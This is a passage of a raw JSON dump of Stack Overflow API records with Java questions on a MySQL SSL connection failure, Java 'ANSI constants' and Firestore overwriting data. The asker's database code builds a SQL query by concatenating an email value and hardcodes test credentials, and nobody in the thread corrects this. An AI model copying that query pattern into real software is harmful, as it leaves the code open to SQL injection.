protocol)](https://stackoverflow.com/questions/67332909/why-can-java-not-connect-to-mysql-5-7-after-the-latest-jdk-update-and-how-should) might help you.","body":"I asked for the full versions. &quot;Java 8&quot; is not a full version and you should know your MySQL Connector/J version. In any case, see <a href=\"https://stackoverflow.com/questions/67332909/why-can-java-not-connect-to-mysql-5-7-after-the-latest-jdk-update-and-how-should\">Why can Java not connect to MySQL 5.7 after the latest JDK update and how should it be fixed? (ssl.SSLHandshakeException: No appropriate protocol)</a> might help you."}],"owner":{"account_id":23419335,"reputation":108,"user_id":17479815,"display_name":"Yan"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":197,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639579820,"creation_date":1639578352,"question_id":70365370,"body_markdown":"I am trying to connect my code to the database in linux i use the same code in windows it works fine but once i use it in linux it doesn&#39;t the information on my machine should be the same since i am using a virtual box for linux so if it works on windows it should work on linux .     \r\n    \r\n```\r\npublic String DataBaseGetCode(String Email) {\r\n    Reporter.log(&quot;&lt;/br&gt;- Performed Action : Extracting Data from DB&quot;);\r\n    // final String JDBC_DRIVER = &quot;com.mysql.jdc.Driver&quot;;\r\n    final String DB_URL = &quot;jdbc:mysql://23.465.165.568:3306/test&quot;;\r\n\r\n    // DataBase Credentials\r\n    final String User = &quot;test&quot;;\r\n    final String Password = &quot;test&quot;;\r\n\r\n    // DataBase Data\r\n    String CodeSMS = null;\r\n    Connection con = null;\r\n    Statement stmt = null;\r\n\r\n    try {\r\n        Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);\r\n        try {\r\n            // Open Connection\r\n            con = DriverManager.getConnection(DB_URL, User, Password);\r\n\r\n            // Execute Query\r\n            stmt = con.createStatement();\r\n            String SqlQuery = &quot;SELECT code FROM `table` WHERE email =&#39;&quot; + Email + &quot;&#39;&quot;;\r\n            System.out.println(SqlQuery);\r\n            ResultSet executeQuery = stmt.executeQuery(SqlQuery);\r\n            System.out.println(executeQuery);\r\n            // Extract Data From query\r\n            if (executeQuery.next()) {\r\n                CodeSMS = executeQuery.getString(&quot;code&quot;);\r\n                Reporter.log(FormatMessageSucces + &quot; Data extracted Correctly&lt;/font&gt;&quot;);\r\n            }\r\n            // Close All Connections\r\n            executeQuery.close();\r\n            stmt.close();\r\n            con.close();\r\n\r\n        } catch (SQLException e) {\r\n            // TODO Auto-generated catch block\r\n            e.printStackTrace();\r\n        }\r\n\r\n    } catch (ClassNotFoundException e) {\r\n        // TODO Auto-generated catch block\r\n        e.printStackTrace();\r\n    }\r\n\r\n    return CodeSMS;\r\n}\r\n```\r\n\r\nSadly i have this error message that shows and i dont have the smallest idea why it s happening :\r\n\r\n```\r\ncom.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure\r\n    The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.\r\n\tat com.mysql.cj.jdbc.exceptions.SQLError.createCommunicationsException(SQLError.java:174)\r\n  \tat com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:64)\r\n\tat com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:835)\r\n   \tat com.mysql.cj.jdbc.ConnectionImpl.&lt;init&gt;(ConnectionImpl.java:455)\r\n\tat com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:240)\r\n   \tat com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:199)\r\n\tat java.sql.DriverManager.getConnection(DriverManager.java:664)\r\n   \tat java.sql.DriverManager.getConnection(DriverManager.java:247)\r\n\tat MecaGOO.Functions.TESTDataBaseGetCode(Functions.java:732)\r\n   \tat MecaGOO.FaireCommande.TakeAppointementWithoutAccount(FaireCommande.java:62)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n   \tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n   \tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n   \tat java.lang.reflect.Method.invoke(Method.java:498)\r\n   \tat org.testng.internal.MethodInvocationHelper.invokeMethod(MethodInvocationHelper.java:104)\r\n    at org.testng.internal.Invoker.invokeMethod(Invoker.java:645)\r\n    at org.testng.internal.Invoker.invokeTestMethod(Invoker.java:851)\r\n    at org.testng.internal.Invoker.invokeTestMethods(Invoker.java:1177)\r\n    at org.testng.internal.TestMethodWorker.invokeTestMethods(TestMethodWorker.java:129)\r\n    at org.testng.internal.TestMethodWorker.run(TestMethodWorker.java:112)\r\n    at org.testng.TestRunner.privateRun(TestRunner.java:756)\r\n    at org.testng.TestRunner.run(TestRunner.java:610)\r\n    at org.testng.SuiteRunner.runTest(SuiteRunner.java:387)\r\n    at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:382)\r\n    at org.testng.SuiteRunner.privateRun(SuiteRunner.java:340)\r\n    at org.testng.SuiteRunner.run(SuiteRunner.java:289)\r\n    at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:52)\r\n    at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:86)\r\n    at org.testng.TestNG.runSuitesSequentially(TestNG.java:1293)\r\n    at org.testng.TestNG.runSuitesLocally(TestNG.java:1218)\r\n    at org.testng.TestNG.runSuites(TestNG.java:1133)\r\n    at org.testng.TestNG.run(TestNG.java:1104)\r\n    at org.testng.TestNG.privateMain(TestNG.java:1434)\r\n    at org.testng.TestNG.main(TestNG.java:1403)\r\nCaused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure\r\n    \r\n    The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.\r\n    at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)\r\n    at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)\r\n    at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)\r\n    at java.lang.reflect.Constructor.newInstance(Constructor.java:423)\r\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61)\r\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105)\r\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151)\r\n    at com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167)\r\n    at com.mysql.cj.protocol.a.NativeProtocol.negotiateSSLConnection(NativeProtocol.java:361)\r\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.negotiateSSLConnection(NativeAuthenticationProvider.java:777)\r\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.proceedHandshakeWithPluggableAuthentication(NativeAuthenticationProvider.java:486)\r\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.connect(NativeAuthenticationProvider.java:202)\r\n    at com.mysql.cj.protocol.a.NativeProtocol.connect(NativeProtocol.java:1449)\r\n    at com.mysql.cj.NativeSession.connect(NativeSession.java:165)\r\n    at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:955)\r\n    at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:825)\r\n    \t... 31 more\r\nCaused by: javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disabled or cipher suites are inappropriate)\r\n    at sun.security.ssl.HandshakeContext.&lt;init&gt;(HandshakeContext.java:171)\r\n    at sun.security.ssl.ClientHandshakeContext.&lt;init&gt;(ClientHandshakeContext.java:98)\r\n    at sun.security.ssl.TransportContext.kickstart(TransportContext.java:220)\r\n    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:428)\r\n    at com.mysql.cj.protocol.ExportControlled.performTlsHandshake(ExportControlled.java:315)\r\n    at com.mysql.cj.protocol.StandardSocketFactory.performTlsHandshake(StandardSocketFactory.java:188)\r\n    at com.mysql.cj.protocol.a.NativeSocketConnection.performTlsHandshake(NativeSocketConnection.java:99)\r\n    at com.mysql.cj.protocol.a.NativeProtocol.negotiateSSLConnection(NativeProtocol.java:352)\r\n    \t... 38 more\r\n```","title":"Connection to Mysql database works fine from Windows but not from Linux","body":"<p>I am trying to connect my code to the database in linux i use the same code in windows it works fine but once i use it in linux it doesn't the information on my machine should be the same since i am using a virtual box for linux so if it works on windows it should work on linux .</p>\n<pre><code>public String DataBaseGetCode(String Email) {\n    Reporter.log(&quot;&lt;/br&gt;- Performed Action : Extracting Data from DB&quot;);\n    // final String JDBC_DRIVER = &quot;com.mysql.jdc.Driver&quot;;\n    final String DB_URL = &quot;jdbc:mysql://23.465.165.568:3306/test&quot;;\n\n    // DataBase Credentials\n    final String User = &quot;test&quot;;\n    final String Password = &quot;test&quot;;\n\n    // DataBase Data\n    String CodeSMS = null;\n    Connection con = null;\n    Statement stmt = null;\n\n    try {\n        Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);\n        try {\n            // Open Connection\n            con = DriverManager.getConnection(DB_URL, User, Password);\n\n            // Execute Query\n            stmt = con.createStatement();\n            String SqlQuery = &quot;SELECT code FROM `table` WHERE email ='&quot; + Email + &quot;'&quot;;\n            System.out.println(SqlQuery);\n            ResultSet executeQuery = stmt.executeQuery(SqlQuery);\n            System.out.println(executeQuery);\n            // Extract Data From query\n            if (executeQuery.next()) {\n                CodeSMS = executeQuery.getString(&quot;code&quot;);\n                Reporter.log(FormatMessageSucces + &quot; Data extracted Correctly&lt;/font&gt;&quot;);\n            }\n            // Close All Connections\n            executeQuery.close();\n            stmt.close();\n            con.close();\n\n        } catch (SQLException e) {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        }\n\n    } catch (ClassNotFoundException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n\n    return CodeSMS;\n}\n</code></pre>\n<p>Sadly i have this error message that shows and i dont have the smallest idea why it s happening :</p>\n<pre><code>com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure\n    The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.\n    at com.mysql.cj.jdbc.exceptions.SQLError.createCommunicationsException(SQLError.java:174)\n    at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:64)\n    at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:835)\n    at com.mysql.cj.jdbc.ConnectionImpl.&lt;init&gt;(ConnectionImpl.java:455)\n    at com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:240)\n    at com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:199)\n    at java.sql.DriverManager.getConnection(DriverManager.java:664)\n    at java.sql.DriverManager.getConnection(DriverManager.java:247)\n    at MecaGOO.Functions.TESTDataBaseGetCode(Functions.java:732)\n    at MecaGOO.FaireCommande.TakeAppointementWithoutAccount(FaireCommande.java:62)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.lang.reflect.Method.invoke(Method.java:498)\n    at org.testng.internal.MethodInvocationHelper.invokeMethod(MethodInvocationHelper.java:104)\n    at org.testng.internal.Invoker.invokeMethod(Invoker.java:645)\n    at org.testng.internal.Invoker.invokeTestMethod(Invoker.java:851)\n    at org.testng.internal.Invoker.invokeTestMethods(Invoker.java:1177)\n    at org.testng.internal.TestMethodWorker.invokeTestMethods(TestMethodWorker.java:129)\n    at org.testng.internal.TestMethodWorker.run(TestMethodWorker.java:112)\n    at org.testng.TestRunner.privateRun(TestRunner.java:756)\n    at org.testng.TestRunner.run(TestRunner.java:610)\n    at org.testng.SuiteRunner.runTest(SuiteRunner.java:387)\n    at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:382)\n    at org.testng.SuiteRunner.privateRun(SuiteRunner.java:340)\n    at org.testng.SuiteRunner.run(SuiteRunner.java:289)\n    at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:52)\n    at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:86)\n    at org.testng.TestNG.runSuitesSequentially(TestNG.java:1293)\n    at org.testng.TestNG.runSuitesLocally(TestNG.java:1218)\n    at org.testng.TestNG.runSuites(TestNG.java:1133)\n    at org.testng.TestNG.run(TestNG.java:1104)\n    at org.testng.TestNG.privateMain(TestNG.java:1434)\n    at org.testng.TestNG.main(TestNG.java:1403)\nCaused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure\n    \n    The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.\n    at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)\n    at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)\n    at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)\n    at java.lang.reflect.Constructor.newInstance(Constructor.java:423)\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61)\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105)\n    at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151)\n    at com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167)\n    at com.mysql.cj.protocol.a.NativeProtocol.negotiateSSLConnection(NativeProtocol.java:361)\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.negotiateSSLConnection(NativeAuthenticationProvider.java:777)\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.proceedHandshakeWithPluggableAuthentication(NativeAuthenticationProvider.java:486)\n    at com.mysql.cj.protocol.a.NativeAuthenticationProvider.connect(NativeAuthenticationProvider.java:202)\n    at com.mysql.cj.protocol.a.NativeProtocol.connect(NativeProtocol.java:1449)\n    at com.mysql.cj.NativeSession.connect(NativeSession.java:165)\n    at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:955)\n    at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:825)\n        ... 31 more\nCaused by: javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disabled or cipher suites are inappropriate)\n    at sun.security.ssl.HandshakeContext.&lt;init&gt;(HandshakeContext.java:171)\n    at sun.security.ssl.ClientHandshakeContext.&lt;init&gt;(ClientHandshakeContext.java:98)\n    at sun.security.ssl.TransportContext.kickstart(TransportContext.java:220)\n    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:428)\n    at com.mysql.cj.protocol.ExportControlled.performTlsHandshake(ExportControlled.java:315)\n    at com.mysql.cj.protocol.StandardSocketFactory.performTlsHandshake(StandardSocketFactory.java:188)\n    at com.mysql.cj.protocol.a.NativeSocketConnection.performTlsHandshake(NativeSocketConnection.java:99)\n    at com.mysql.cj.protocol.a.NativeProtocol.negotiateSSLConnection(NativeProtocol.java:352)\n        ... 38 more\n</code></pre>\n"},{"tags":["java","naming-conventions","history"],"comments":[{"owner":{"account_id":102965,"reputation":415230,"user_id":276052,"accept_rate":80,"display_name":"aioobe"},"score":2,"creation_date":1427495209,"post_id":19174748,"comment_id":46816040,"body_markdown":"this is an interesting question. I&#39;m curious about your thoughts on my answer. Also, I happen to work at Oracle and I could check if any of the original authors are still here if you&#39;re after a more authoritative answer.","body":"this is an interesting question. I&#39;m curious about your thoughts on my answer. Also, I happen to work at Oracle and I could check if any of the original authors are still here if you&#39;re after a more authoritative answer."}],"answers":[{"tags":[],"owner":{"account_id":123958,"reputation":109285,"user_id":318758,"accept_rate":100,"display_name":"Joni"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1380869209,"creation_date":1380869209,"answer_id":19174984,"question_id":19174748,"body_markdown":"The only references on the internet on what are ANSI constants are in forums where people who have read the naming conventions ask the same question. It seems that the term was invented by the person who wrote the document and you would have to ask them what they meant.\r\n\r\nANSI is a national standards body in the USA, known for example for the ASCII character set standard and the ANSI C language standard. ANSI is also what Microsoft Windows calls the regional ASCII-based default character encoding. It&#39;s possible that the author was referring to string literals.","title":"Java &quot;ANSI constants&quot;","body":"<p>The only references on the internet on what are ANSI constants are in forums where people who have read the naming conventions ask the same question. It seems that the term was invented by the person who wrote the document and you would have to ask them what they meant.</p>\n\n<p>ANSI is a national standards body in the USA, known for example for the ASCII character set standard and the ANSI C language standard. ANSI is also what Microsoft Windows calls the regional ASCII-based default character encoding. It's possible that the author was referring to string literals.</p>\n"},{"tags":[],"owner":{"account_id":102965,"reputation":415230,"user_id":276052,"accept_rate":80,"display_name":"aioobe"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1427318561,"creation_date":1427318561,"answer_id":29266796,"question_id":19174748,"body_markdown":"They are most likely referring to ANSI C constants, [defined as follows](http://www.oualline.com/books.free/style/c06.html)\r\n\r\n&gt; In ANSI C constants can be defined two ways: through the #define statement and through use of the const modifier. For example, the following two statement, are equivalent:\r\n&gt;\r\n&gt;     #define LENGTH 10       /* Length of the square in inches */\r\n&gt;\r\n&gt;     const int length = 10;  /* Length of the square in inches */\r\n\r\nNow there are obviously no C constants in Java, because Java is not C :-) (that&#39;s not the strangest part of the official coding conventions, but I digress).\r\n\r\nSo why did they write ANSI constants? This is most likely just a convenient way of referring to final primitives and immutable objects. Remember that in C the fields of a `const struct` can&#39;t be updated after initialization, and there&#39;s no corresponding Java term for such &quot;constant&quot; (`final` doesn&#39;t capture the notion of immutability very well).\r\n","title":"Java &quot;ANSI constants&quot;","body":"<p>They are most likely referring to ANSI C constants, <a href=\"http://www.oualline.com/books.free/style/c06.html\" rel=\"noreferrer\">defined as follows</a></p>\n\n<blockquote>\n  <p>In ANSI C constants can be defined two ways: through the #define statement and through use of the const modifier. For example, the following two statement, are equivalent:</p>\n\n<pre><code>#define LENGTH 10       /* Length of the square in inches */\n\nconst int length = 10;  /* Length of the square in inches */\n</code></pre>\n</blockquote>\n\n<p>Now there are obviously no C constants in Java, because Java is not C :-) (that's not the strangest part of the official coding conventions, but I digress).</p>\n\n<p>So why did they write ANSI constants? This is most likely just a convenient way of referring to final primitives and immutable objects. Remember that in C the fields of a <code>const struct</code> can't be updated after initialization, and there's no corresponding Java term for such \"constant\" (<code>final</code> doesn't capture the notion of immutability very well).</p>\n"},{"tags":[],"owner":{"account_id":10123720,"reputation":1,"user_id":8826409,"display_name":"HawkEye"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1604385183,"creation_date":1604385183,"answer_id":64657805,"question_id":19174748,"body_markdown":"Here, **ANSI Constants** refer to the predefined constants defined by the ANSI (American National Standards Institute). Please, refer to this [link][1] for more details. \r\n\r\n&gt; ANSI is actually an orginization the establishes standards that makes life easier on all of us. There are ANSI standards established for a lot of things. ASCII the numeric encoding that maps the value to the character representation ie 65 = A, is covered by an ANSI standard. NaN (not a number) is a value that can be return by floating point calculations, and that value is defined by ANSI in conjuction with IEEE. Constants are established for a lot of things by ANSI especially in areas of communications such as SQL, Character Sets, colors ( thats why black is a value of 0 on most computers!) etc. So if you define a constant that represents a constant defined in an ANSI standard such as\r\npublic static final ANSI_BLACK = 0;\r\nyou should follow these conventions.\r\n(Notice Sun violates these conventions a lot as with NaN, Color.black etc.)\r\n\r\n&gt; I Hope This Helps\r\n&gt; Carl Trusiak, SCJP2, SCWCD\r\n\r\nUsing these may cause internal conflicts while debugging as there may be wrong references to the user-defined constants or the implied value of the constant. \r\n\r\n\r\n  [1]: https://coderanch.com/t/386728/java/ANSI-Constants\r\n\r\n\r\n","title":"Java &quot;ANSI constants&quot;","body":"<p>Here, <strong>ANSI Constants</strong> refer to the predefined constants defined by the ANSI (American National Standards Institute). Please, refer to this <a href=\"https://coderanch.com/t/386728/java/ANSI-Constants\" rel=\"nofollow noreferrer\">link</a> for more details.</p>\n<blockquote>\n<p>ANSI is actually an orginization the establishes standards that makes life easier on all of us. There are ANSI standards established for a lot of things. ASCII the numeric encoding that maps the value to the character representation ie 65 = A, is covered by an ANSI standard. NaN (not a number) is a value that can be return by floating point calculations, and that value is defined by ANSI in conjuction with IEEE. Constants are established for a lot of things by ANSI especially in areas of communications such as SQL, Character Sets, colors ( thats why black is a value of 0 on most computers!) etc. So if you define a constant that represents a constant defined in an ANSI standard such as\npublic static final ANSI_BLACK = 0;\nyou should follow these conventions.\n(Notice Sun violates these conventions a lot as with NaN, Color.black etc.)</p>\n</blockquote>\n<blockquote>\n<p>I Hope This Helps\nCarl Trusiak, SCJP2, SCWCD</p>\n</blockquote>\n<p>Using these may cause internal conflicts while debugging as there may be wrong references to the user-defined constants or the implied value of the constant.</p>\n"}],"owner":{"account_id":45531,"reputation":25386,"user_id":134252,"accept_rate":66,"display_name":"Dolda2000"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":5163,"favorite_count":0,"down_vote_count":0,"up_vote_count":27,"answer_count":3,"score":27,"last_activity_date":1639579548,"creation_date":1380868175,"question_id":19174748,"body_markdown":"I hit this little tidbit while browsing the Java Code Conventions:\r\n\r\n&gt;The names of variables declared class constants and of ANSI constants should be all uppercase with words separated by underscores (&quot;_&quot;). (ANSI constants should be avoided, for ease of debugging.)\r\n\r\n(From [here][1].)\r\n\r\nWhat are these &quot;ANSI constants&quot; this document speaks of? And how do they make debugging harder?\r\n\r\nThe text makes it sound as if there is a dichotomy between &quot;variables declared class constants&quot; (which I interpret as ordinary `static final` variables) and these &quot;ANSI constants&quot;, but I&#39;m not aware of any way to declare constants in Java other than to make them `static final` variables.\r\n\r\n  [1]: http://www.oracle.com/technetwork/java/javase/documentation/codeconventions-135099.html\r\n","title":"Java &quot;ANSI constants&quot;","body":"<p>I hit this little tidbit while browsing the Java Code Conventions:</p>\n\n<blockquote>\n  <p>The names of variables declared class constants and of ANSI constants should be all uppercase with words separated by underscores (\"_\"). (ANSI constants should be avoided, for ease of debugging.)</p>\n</blockquote>\n\n<p>(From <a href=\"http://www.oracle.com/technetwork/java/javase/documentation/codeconventions-135099.html\" rel=\"noreferrer\">here</a>.)</p>\n\n<p>What are these \"ANSI constants\" this document speaks of? And how do they make debugging harder?</p>\n\n<p>The text makes it sound as if there is a dichotomy between \"variables declared class constants\" (which I interpret as ordinary <code>static final</code> variables) and these \"ANSI constants\", but I'm not aware of any way to declare constants in Java other than to make them <code>static final</code> variables.</p>\n"},{"tags":["java","android","firebase","google-cloud-firestore"],"answers":[{"tags":[],"owner":{"account_id":72426,"reputation":573714,"user_id":209103,"accept_rate":73,"display_name":"Frank van Puffelen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1622990366,"creation_date":1622990366,"answer_id":67860272,"question_id":67859221,"body_markdown":"If you call `.set(profile)`, you&#39;re replacing the existing data with whatever is in `profile`. If you want to merge the values in `profile` with any existing data in the document, use `.update(profile)` instead.\r\n\r\nAlso see the Firebase documentation on [updating data in a document](https://firebase.google.com/docs/firestore/manage-data/add-data#update-data).\r\n","title":"Firebase Fire store database replacing all data to single one","body":"<p>If you call <code>.set(profile)</code>, you're replacing the existing data with whatever is in <code>profile</code>. If you want to merge the values in <code>profile</code> with any existing data in the document, use <code>.update(profile)</code> instead.</p>\n<p>Also see the Firebase documentation on <a href=\"https://firebase.google.com/docs/firestore/manage-data/add-data#update-data\" rel=\"nofollow noreferrer\">updating data in a document</a>.</p>\n"},{"tags":[],"owner":{"account_id":21811093,"reputation":168,"user_id":16108645,"display_name":"Venkatesh Talacheeru"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1622990844,"creation_date":1622990844,"answer_id":67860347,"question_id":67859221,"body_markdown":"If you just looking to update a single field when can do so without using any Map values.\r\n\r\n    firestore.collection(&quot;YOUR_COLLECTION&quot;).document(user.getUid()).update(&quot;profile&quot;, imageUri.toString())\r\n                    .addOnCompleteListener(task -&gt; {\r\n                        \r\n                    });\r\n\r\n","title":"Firebase Fire store database replacing all data to single one","body":"<p>If you just looking to update a single field when can do so without using any Map values.</p>\n<pre><code>firestore.collection(&quot;YOUR_COLLECTION&quot;).document(user.getUid()).update(&quot;profile&quot;, imageUri.toString())\n                .addOnCompleteListener(task -&gt; {\n                    \n                });\n</code></pre>\n"},{"tags":[],"owner":{"account_id":21834024,"reputation":115,"user_id":16128598,"display_name":"Angel"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1623051543,"creation_date":1623051543,"answer_id":67867693,"question_id":67859221,"body_markdown":"thanks for your answers. I already solved the problem. I have attached the codes below.\r\n\r\n\r\nprivate void updateUserProfile() {\r\n\r\n\r\n\r\n\r\n      Map&lt;String, Object&gt; profile = new HashMap&lt;&gt;();\r\n\r\n      profile.put(&quot;profile&quot;, imageUri.toString());\r\n\r\n\r\n\r\n        final DocumentReference sDoc = database.collection(&quot;Users&quot;).document(FirebaseAuth.getInstance().getUid());\r\n        database.runTransaction(new Transaction.Function&lt;Void&gt;() {\r\n\r\n\r\n            @Override\r\n            public Void apply(@NonNull  Transaction transaction) throws FirebaseFirestoreException {\r\n                DocumentSnapshot snapshot = transaction.get(sDoc);\r\n\r\n\r\n                transaction.update(sDoc, profile);\r\n              //  transaction.update(sDoc, &quot;name&quot;, binding.nameBox.getText() );\r\n\r\n                return null;\r\n            }","title":"Firebase Fire store database replacing all data to single one","body":"<p>thanks for your answers. I already solved the problem. I have attached the codes below.</p>\n<p>private void updateUserProfile() {</p>\n<pre><code>  Map&lt;String, Object&gt; profile = new HashMap&lt;&gt;();\n\n  profile.put(&quot;profile&quot;, imageUri.toString());\n\n\n\n    final DocumentReference sDoc = database.collection(&quot;Users&quot;).document(FirebaseAuth.getInstance().getUid());\n    database.runTransaction(new Transaction.Function&lt;Void&gt;() {\n\n\n        @Override\n        public Void apply(@NonNull  Transaction transaction) throws FirebaseFirestoreException {\n            DocumentSnapshot snapshot = transaction.get(sDoc);\n\n\n            transaction.update(sDoc, profile);\n          //  transaction.update(sDoc, &quot;name&quot;, binding.nameBox.getText() );\n\n            return null;\n        }\n</code></pre>\n"}],"owner":{"account_id":21834024,"reputation":115,"user_id":16128598,"display_name":"Angel"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":179,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":67867693,"answer_count":3,"score":0,"last_activity_date":1639579487,"creation_date":1622983138,"question_id":67859221,"body_markdown":"I have an error. when the user uploads his image.  the other data were gone and only the profile URI is visible.\r\n\r\nCurrently, I have 5 strings\r\n* name\r\n* email\r\n* password\r\n* profile(image URI)\r\n* refer id\r\n* coins \r\n\r\n\r\nHowever, when a user uploads their profile photo, all the data is removed.\r\n\r\nshowing only the profile image URI\r\n\r\nI have attached the code here\r\n\r\n\r\n\r\n    private void updateUserProfile() {\r\n        Map&lt;String,String &gt; profile = new HashMap&lt;&gt;();\r\n        profile.put(&quot;profile&quot;,imageUri.toString());\r\n\r\n        database\r\n                .collection(&quot;Users&quot;) // the path of users.\r\n                .document(FirebaseAuth.getInstance().getUid()) // to update in the current users.\r\n            //    .update(user)\r\n                .set(profile)\r\n                .addOnSuccessListener(new OnSuccessListener&lt;Void&gt;() {\r\n                    @Override\r\n                    public void onSuccess(Void unused) {\r\n\r\n                     Toast.makeText(getContext(), &quot;Photo Updated!&quot;, Toast.LENGTH_SHORT).show();\r\n\r\n                    }\r\n                });\r\n    }","title":"Firebase Fire store database replacing all data to single one","body":"<p>I have an error. when the user uploads his image.  the other data were gone and only the profile URI is visible.</p>\n<p>Currently, I have 5 strings</p>\n<ul>\n<li>name</li>\n<li>email</li>\n<li>password</li>\n<li>profile(image URI)</li>\n<li>refer id</li>\n<li>coins</li>\n</ul>\n<p>However, when a user uploads their profile photo, all the data is removed.</p>\n<p>showing only the profile image URI</p>\n<p>I have attached the code here</p>\n<pre><code>private void updateUserProfile() {\n    Map&lt;String,String &gt; profile = new HashMap&lt;&gt;();\n    profile.put(&quot;profile&quot;,imageUri.toString());\n\n    database\n            .collection(&quot;Users&quot;) // the path of users.\n            .document(FirebaseAuth.getInstance().getUid()) // to update in the current users.\n        //    .update(user)\n            .set(profile)\n            .addOnSuccessListener(new OnSuccessListener&lt;Void&gt;() {\n                @Override\n                public void onSuccess(Void unused) {\n\n                 Toast.makeText(getContext(), &quot;Photo Updated!&quot;, Toast.LENGTH_SHORT).show();\n\n                }\n            });\n}\n</code></pre>\n"},{"tags":["java","elasticsearch","logging","log4j"],"comments":[{"owner":{"account_id":23128,"reputation":13127,"user_id":57719,"display_name":"Chin Huang"},"score":1,"creation_date":1639505162,"post_id":70352068,"comment_id":124363929,"body_markdown":"The [Elasticsearch announcement regarding CVE-2021-44228](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476) says your Elasticsearch and Java version are not vulnerable. Why go to the trouble of replacing the files?","body":"The <a href=\"https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476\" rel=\"nofollow noreferrer\">Elasticsearch announcement regarding CVE-2021-44228</a> says your Elasticsearch and Java version are not vulnerable. Why go to the trouble of replacing the 